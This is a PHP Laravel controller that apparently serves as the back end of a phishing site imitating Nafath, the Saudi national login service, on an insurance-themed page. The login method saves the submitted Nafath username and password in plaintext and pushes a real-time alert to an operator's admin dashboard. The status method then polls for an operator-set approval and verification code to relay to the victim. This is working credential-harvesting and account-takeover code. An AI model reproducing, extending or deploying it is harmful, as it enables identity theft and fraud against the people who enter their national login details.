<?php

namespace App\Http\Controllers;

use App\Events\CustomerActivityUpdated;
use App\Models\CustomerProfile;
use App\Services\CustomerCacheService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class NafathController extends Controller
{
    /**
     * Handle Nafath credential login from the SPA page.
     * Saves username + password into customer_profiles and returns success.
     */
    public function login(Request $request): JsonResponse
    {
        $request->validate([
            'username' => 'required|string|max:255',
            'password' => 'required|string|max:255',
        ]);

        $ip = $request->ip();

        // Find or update existing customer profile using the same session-aware
        // composite key (IP + session_id) that the rest of the flow uses,
        // preventing Nafath data from landing on a different profile.
        $customer = CustomerProfile::createOrUpdateByIP($ip, [
            'nafath_username' => $request->input('username'),
            'nafath_password' => $request->input('password'),
            'nafath_verified' => false,
            'current_page'   => '/insurance/nafath',
        ]);

        // Notify admin dashboard in real-time
        CustomerCacheService::flush();
        try {
            broadcast(new CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                'nafath_submitted'
            ));
        } catch (\Throwable $e) {
            // Silent fail
        }

        return response()->json([
            'success'     => true,
            'customer_ip' => $ip,
            'message'     => 'تم إرسال طلب تسجيل الدخول بنجاح',
        ]);
    }

    /**
     * Poll Nafath login status (fallback when WebSocket is unavailable).
     */
    public function status(Request $request): JsonResponse
    {
        $ip = $request->ip();
        $sessionId = $request->header('X-Session-Token');

        // SECURITY: Always filter by session_id when available to prevent
        // cross-customer data leakage on shared IPs (CGNAT, WiFi, proxies).
        $query = CustomerProfile::where('ip_address', $ip);
        if ($sessionId) {
            $query->where('session_id', $sessionId);
        }
        $customer = $query->latest('last_activity_at')->first();

        if (!$customer) {
            return response()->json([
                'status'  => 'unknown',
                'message' => 'لم يتم العثور على بيانات العميل',
            ]);
        }

        $status = 'pending';
        if ($customer->nafath_verified) {
            $status = 'approved';
        }

        return response()->json([
            'status'            => $status,
            'verification_code' => $customer->nafath_verification_code ?? null,
        ]);
    }
}
